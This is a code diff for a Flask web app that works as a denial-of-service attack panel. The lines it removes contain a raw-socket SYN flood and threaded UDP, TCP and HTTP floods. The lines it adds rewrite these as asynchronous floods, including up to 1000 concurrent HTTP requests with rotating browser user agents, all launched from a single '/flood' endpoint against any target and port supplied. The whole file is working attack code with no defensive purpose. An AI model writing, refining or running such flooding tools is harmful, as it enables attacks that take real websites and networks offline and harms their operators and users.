@@ -1,114 +1,90 @@
 from flask import Flask, request, jsonify, render_template
 import socket
-import threading
-import time
-import requests
+import asyncio
+import aiohttp
 import random
+import time
 
 app = Flask(__name__)
 
-# List of user agents to simulate different browsers and devices
+# List of user agents
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36"
 ]
 
-def syn_flood(target_ip, target_port, duration):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+async def http_flood(target, duration, semaphore):
+    async with aiohttp.ClientSession() as session:
+        start_time = time.time()
+        while time.time() - start_time < duration:
+            async with semaphore:
+                try:
+                    headers = {
+                        "User-Agent": random.choice(user_agents),
+                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                        "Accept-Language": "en-US,en;q=0.5",
+                        "Accept-Encoding": "gzip, deflate",
+                        "Connection": "keep-alive",
+                        "Upgrade-Insecure-Requests": "1"
+                    }
+                    async with session.get(target, headers=headers) as response:
+                        print(f"Sent request to {target}, status code: {response.status}")
+                except Exception as e:
+                    print(f"HTTP Flood Error: {e}")
+                    pass
 
-    ip_header = b'\x45\x00\x00\x28'
-    ip_header += socket.inet_aton(target_ip)
-    ip_header += socket.inet_aton(target_ip)
-    ip_header += b'\x00\x06\x00\x00'
-    ip_header += b'\x40\x06\x00\x00'
-    ip_header += b'\x00\x00\x00\x00\x00\x00\x00\x00'
-
-    tcp_header = b'\x00\x00\x00\x00'
-    tcp_header += b'\x00\x00\x00\x00'
-    tcp_header += b'\x00\x00\x00\x00'
-    tcp_header += b'\x00\x00\x00\x00'
-    tcp_header += b'\x50\x02\x00\x00'
-    tcp_header += b'\x00\x00\x00\x00'
-    tcp_header += b'\x00\x00\x00\x00'
-
-    packet = ip_header + tcp_header
-
-    end_time = time.time() + duration
-    while time.time() < end_time:
-        sock.sendto(packet, (target_ip, target_port))
-
-def udp_flood(target_ip, target_port, duration):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    message = b'\x00\x01\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00'
-
-    end_time = time.time() + duration
-    while time.time() < end_time:
-        sock.sendto(message, (target_ip, target_port))
-
-def tcp_flood(target_ip, target_port, duration):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect((target_ip, target_port))
-    sock.send(b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n\r\n')
-
-    end_time = time.time() + duration
-    while time.time() < end_time:
-        sock.send(b'A' * 1024)
-
-def http_flood(target_url, duration):
-    end_time = time.time() + float(duration)  # Convert duration to float
-    while time.time() < end_time:
+async def udp_flood(target, port, duration):
+    start_time = time.time()
+    while time.time() - start_time < duration:
         try:
-            headers = {'User-Agent': random.choice(user_agents)}
-            requests.get(target_url, headers=headers)
-        except requests.exceptions.RequestException:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.sendto(b"AAAAA", (target, port))
+            sock.close()
+        except Exception as e:
+            print(f"UDP Flood Error: {e}")
+            pass
+
+async def tcp_flood(target, port, duration):
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((target, port))
+            sock.send(b"AAAAA")
+            sock.close()
+        except Exception as e:
+            print(f"TCP Flood Error: {e}")
             pass
 
 @app.route('/')
 def index():
     return render_template('index.html')
 
-@app.route('/syn_flood', methods=['POST'])
-def syn_flood_endpoint():
+@app.route('/flood', methods=['POST'])
+def flood():
     data = request.json
-    target_ip = data['target_ip']
-    target_port = data['target_port']
-    duration = float(data['duration'])  # Convert duration to float
+    target = data['target']
+    port = int(data['port'])
+    duration = int(data['duration'])
+    attack_type = data['attack_type']
 
-    threading.Thread(target=syn_flood, args=(target_ip, target_port, duration)).start()
-    return jsonify({"status": "SYN flood started"})
+    if attack_type == 'http':
+        semaphore = asyncio.Semaphore(1000)  # Limit the number of concurrent requests
+        asyncio.run(http_flood(target, duration, semaphore))
+    elif attack_type == 'udp':
+        asyncio.run(udp_flood(target, port, duration))
+    elif attack_type == 'tcp':
+        asyncio.run(tcp_flood(target, port, duration))
 
-@app.route('/udp_flood', methods=['POST'])
-def udp_flood_endpoint():
-    data = request.json
-    target_ip = data['target_ip']
-    target_port = data['target_port']
-    duration = float(data['duration'])  # Convert duration to float
-
-    threading.Thread(target=udp_flood, args=(target_ip, target_port, duration)).start()
-    return jsonify({"status": "UDP flood started"})
-
-@app.route('/tcp_flood', methods=['POST'])
-def tcp_flood_endpoint():
-    data = request.json
-    target_ip = data['target_ip']
-    target_port = data['target_port']
-    duration = float(data['duration'])  # Convert duration to float
-
-    threading.Thread(target=tcp_flood, args=(target_ip, target_port, duration)).start()
-    return jsonify({"status": "TCP flood started"})
-
-@app.route('/http_flood', methods=['POST'])
-def http_flood_endpoint():
-    data = request.json
-    target_url = data['target_url']
-    duration = float(data['duration'])  # Convert duration to float
-
-    threading.Thread(target=http_flood, args=(target_url, duration)).start()
-    return jsonify({"status": "HTTP flood started"})
+    return jsonify({"status": "attack started"})
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run(host='0.0.0.0', port=5000)
